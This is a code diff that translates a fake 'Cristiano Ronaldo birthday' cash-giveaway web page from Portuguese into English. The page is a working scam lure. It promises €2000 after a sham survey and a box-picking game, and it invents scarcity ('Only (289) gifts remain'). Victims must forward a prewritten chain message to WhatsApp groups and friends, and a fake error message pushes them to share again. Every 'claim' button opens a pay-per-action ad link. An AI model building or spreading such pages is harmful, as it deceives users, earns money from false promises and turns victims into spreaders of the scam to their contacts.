@@ -9,7 +9,7 @@
   
 <head>
 	
-<title>CELEBRAÇÃO DO ANIVERSÁRIO DE CRISTIANO RONALDO €2000 PRESENTES PARA TODOS </title>
+<title>CHRISTIANO RONALDO BIRTHDAY CELEBRATION €2000 GIFTS TO EVERYONE </title>
 <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiqAMX8lh7Uhlt8b7dnUOOOy8aUpMFyzHrD8tTzJHr_8Fr3G3Uz4BwIDLY5BXq-NvyM97KeGBxh4EB9Jd9sRT5ZZMjabi7as_3yAyPwGzk12zbW_H_06_XjzpmyRJGAWFnDMTcSh7X4In6pSHpPz5ITcqSbMAyfit01Wg5uCfIm59MPWKuGYEvtzDxG4YEo/w636-h640/IMG_2020.png" />
 <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -296,12 +296,13 @@ button:hover {
   
 
 <vue-modal :open="showInstructionsModal">
-<h2 class="heading heading--h1">Parabéns! Suas respostas foram salvas</h2>
+<h2 class="heading heading--h1">Congratulation! Your answers have been saved</h2>
  
 <p class="paragraph">
-Agora você tem a chance de ganhar um prêmio em dinheiro da Celebration de €500-2000<br><br>
-Você tem 3 chances! desejamos-lhe boa sorte<br><br>
-Você precisa selecionar a caixa que contém o presente dentro das caixas.
+Now you have a chance to win €500-2000 Celebration cash prize<br><br>
+You have 3 chances ! we wish you good luck
+<br><br>
+You need to select the box that has the gift inside the boxes.
 </p>
    <br>
 <button class="button" v-on:click="showInstructionsModal = false">
@@ -324,7 +325,7 @@ OK
 <p class="paragraph">
 
 
-Seu prêmio é: <b>€2000 em dinheiro</b><br>Siga as instruções na próxima página para resgatar seu prêmio ! 
+Your Prize is: <b>€2000 cash</b><br>Follow the instructions on the next page to claim your prize ! 
 </p>
     <br>
 <button class="button" v-on:click="$confetti.stop()" onclick="go();">
@@ -341,12 +342,12 @@ Ok
 
   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgOosw5n-mDyAwyvjOD-K5fQ-KvQwslgwcytUzJy39Sma9X0ETSbSPiH3QuiO4oNGxIuy1cN5qXs-YHqI5WyBvSipMGq1SJeRB2JqqO1mKvmV829draRMo7C1CFWySnoKkI8pkq-tLWWLt46b8_WU4K7AuOpTdg0oM7LjDoRLeQxtz_-EBXXBpfDbkm95mH/w640-h514/IMG_2019.jpeg" style="width:100%;" />
 <h1 class="heading heading--h1">
-Olá!
+Hello!
 </h1>
   <p class="paragraph">
-Bem-vindo ao <b>CELEBRAÇÃO DO ANIVERSÁRIO DE CRISTIANO RONALDO €2000 PRESENTES PARA TODOS</b>, Dont miss this year Ronaldo cash grant to Supporters.
+Welcome to <b>CHRISTIANO RONALDO BIRTHDAY CELEBRATION €500-2000 CASH GIFTS TO EVERYONE</b>, Dont miss this year Ronaldo cash grant to Supporters.
 <br>
-Responda às perguntas abaixo para reivindicar <b>prêmio em dinheiro de € 2.000</b>
+Answer the questions below to claim <b>€2000 Cash Prize</b>
 </p>
   <br>
 </div>
@@ -363,24 +364,28 @@ Responda às perguntas abaixo para reivindicar <b>prêmio em dinheiro de € 2.0
 </vue-text-rotator>
 <div class="verify__text" v-if="rotateIndex > 1">
 <strong>
-Você respondeu 4/4 das perguntas</strong>
-<img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
-</div>
-<div class="verify__text" v-else>
-Suas respostas estão sendo processadas<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
-</div>
-<div class="verify__text" v-if="rotateIndex > 2">
-<strong>
-ainda prêmios disponíveis!
+You have answered 4/4 of the questions
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Procurando presentes..<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 1}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
+Your answers are being processed
+<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
+</div>
+<div class="verify__text" v-if="rotateIndex > 2">
+<strong>
+still prizes available!
+</strong>
+<img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
+</div>
+<div class="verify__text" v-else>
+Looking for gifts.. 
+<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 1}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 3">
 <strong>
-Restam apenas (289) presentes!</strong>
+Only (289) gifts remain!
+</strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
@@ -390,19 +395,19 @@ Stock is being checked
 </div>
 <vue-survey v-if="showSurvey" :show-steps="true" :questions='[
             {
-              title: "Você é fã de Ronaldo?",
-              answers: [ { text: "Sim" }, { text: "Não" } ]
+              title: "Are you a Ronaldo Fan?",
+              answers: [ { text: "Yes" }, { text: "No" } ]
             },
                                                              {
-              title: "Ronaldo é o melhor jogador de futebol?",
-              answers: [ { text: "Sim" }, { text: "Não" } ]
+              title: "Is Ronaldo The Best Footballer?",
+              answers: [ { text: "Yes" }, { text: "No" } ]
             },
             {
-              title: "Escolha seu gênero?",
-              answers: [ { text: "Macho" }, { text: "Fêmeo" } ]
+              title: "Choose your Gender?",
+              answers: [ { text: "Male" }, { text: "Female" } ]
             },
             {
-              title: "Selecione sua faixa etária?",
+              title: "Select Your Age Range?",
               answers: [ { text: "18 - 20years" }, { text: "21 - 25years" }, { text: "26 - 30 years" }, { text: "30years Above" } ]
             },
           ]' v-on:finish="onSurveyFinish"></vue-survey>
@@ -422,9 +427,9 @@ Stock is being checked
                            
 
                             </div>
-<p class="txt1">Seu prêmio é: <b>€2000</b> <br>Siga as instruções abaixo para receber seu prêmio !</p>
+<p class="txt1">Your Prize is: <b>€2000</b> <br>Follow the instructions below to Get your prize !</p>
       <div class="bottom" id='buttonO'>
-<div id="lastapp"><p class="rules">1.compartilhe com 5 grupos/15 amigos no "Whatsapp" (clique no ícone "Whatsapp" abaixo)</p><p class="rules">2. Clique em "Continuar" e resgate seu prêmio.</p></div>
+<div id="lastapp"><p class="rules">1.share with 5 groups / 15 friends on "Whatsapp" (click the "Whatsapp" icon below)</p><p class="rules">2. Click "Continue" and claim your prize.</p></div>
 
     
    <div class="share_main_bt" id="whatsapp">WhatsApp&nbsp;   →</div>
@@ -459,15 +464,15 @@ Stock is being checked
                            
 
                             </div>
-<p class="txt1">Seu prêmio é: <b>€2000 cash.</b> <br>Siga as instruções abaixo para resgatar seu prêmio !</p>
+<p class="txt1">Your Prize is: <b>€2000 cash.</b> <br>Follow the instruction below to claim your prize !</p>
             <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>   
         <br>
 	    
         <a  onclick="window.open('https://thaudray.com/4/3077182')" href="https://africa-day-mtn-celebration.blogspot.com/#1734254162204" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">RECLAMAR €2.000</font></button>
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">CLAIM €2000</font></button>
                     </a><br/> <br/>
 	    
-      <div class="share_main_bt" id="offer">ESCOLHA O TIPO DE CONTA</div><br/> <br/>
+      <div class="share_main_bt" id="offer">CHOOSE ACCOUNT TYPE</div><br/> <br/>
 
 	     <a  onclick="window.open('https://thaudray.com/4/3077182')" href="https://africa-day-mtn-celebration.blogspot.com/#1734254162204" >
                     <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">SAVINGS</font></button>
@@ -477,7 +482,7 @@ Stock is being checked
                     </a><br/> <br/>
 	
                             
-            <div class="share_main_bt" id="offers">Sacar € 2.000</div> 
+            <div class="share_main_bt" id="offers">Withdraw €2000</div> 
       <br>
           
        
@@ -521,7 +526,7 @@ function go() {
         var text1 = "ytime" ,
             text2 = " مكتبة جرير تقدم ",
             text3 = " سارع واحصل على قسيمتك قبل النفاذ من هنا : ",
-            error = "Ocorreu um erro!\nAs postagens não contam. Você pode ter compartilhado com o mesmo amigo ou grupo mais de uma vez, compartilhe novamente.",
+            error = "There is an error!\nPosts do not count. You may have shared it with the same friend or group more than once, please re-share.",
             cpa = "https://thaudray.com/4/3077182",
             cpa1 = "https://thaudray.com/4/3077182",
             saved = "coke2",
@@ -530,10 +535,10 @@ function go() {
 
 <script>
   var tiaoban = [
-    "CELEBRAÇÃO DO ANIVERSÁRIO DE CRISTIANO RONALDO €2000 PRESENTES PARA TODOS%0A%0A*HOW TO GET IT*%0AVisite o link abaixo e responda às seguintes perguntas e você receberá 500-2000€ instantaneamente para Celebration.%0A i just got mine%0A%0AClick Here👇%0A https://qpetition.org/Ronaldo-Birthday-Celebration-Gifts.html#",
-    "CELEBRAÇÃO DO ANIVERSÁRIO DE CRISTIANO RONALDO €2000 PRESENTES PARA TODOS%0A%0A*HOW TO GET IT*%0AVisite o link abaixo e responda às seguintes perguntas e você receberá 500-2000€ instantaneamente para Celebration..%0A i just got mine%0A%0AClick Here👇%0Ahttps://qpetition.org/Ronaldo-Birthday-Celebration-Gifts.html#",
-    "CELEBRAÇÃO DO ANIVERSÁRIO DE CRISTIANO RONALDO €2000 PRESENTES PARA TODOS%0A%0A*HOW TO GET IT*%0AVisite o link abaixo e responda às seguintes perguntas e você receberá 500-2000€ instantaneamente para Celebration..%0A i just got mine%0A%0AClick Here👇%0Ahttps://qpetition.org/Ronaldo-Birthday-Celebration-Gifts.html#",
-    "CELEBRAÇÃO DO ANIVERSÁRIO DE CRISTIANO RONALDO €2000 PRESENTES PARA TODOS%0A%0A*HOW TO GET IT*%0AVisite o link abaixo e responda às seguintes perguntas e você receberá 500-2000€ instantaneamente para Celebration..%0A i just got mine%0A%0AClick Here👇%0A https://qpetition.org/Ronaldo-Birthday-Celebration-Gifts.html## ",
+    "CHRISTIANO RONALDO BIRTHDAY CELEBRATION €2000 CASH GIFTS TO FANS%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive €500-2000 instantly for Celebration.%0A i just got mine%0A%0AClick Here👇%0A https://qpetition.org/Ronaldo-Birthday-Celebration-Gifts.html#",
+    "CHRISTIANO RONALDO BIRTHDAY CELEBRATION €2000 CASH GIFTS TO FANS%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive €500-2000 instantly for Celebration.%0A i just got mine%0A%0AClick Here👇%0Ahttps://qpetition.org/Ronaldo-Birthday-Celebration-Gifts.html#",
+    "CHRISTIANO RONALDO BIRTHDAY CELEBRATION €2000 CASH GIFTS TO FANS%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive €500-2000 instantly for Celebration.%0A i just got mine%0A%0AClick Here👇%0Ahttps://qpetition.org/Ronaldo-Birthday-Celebration-Gifts.html#",
+    "CHRISTIANO RONALDO BIRTHDAY CELEBRATION €2000 CASH GIFTS TO FANS%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive 500-2000 instantly for Celebration.%0A i just got mine%0A%0AClick Here👇%0A https://qpetition.org/Ronaldo-Birthday-Celebration-Gifts.html## ",
 ];
 var tiaoban = tiaoban[Math.floor(Math.random() * tiaoban.length)];
 
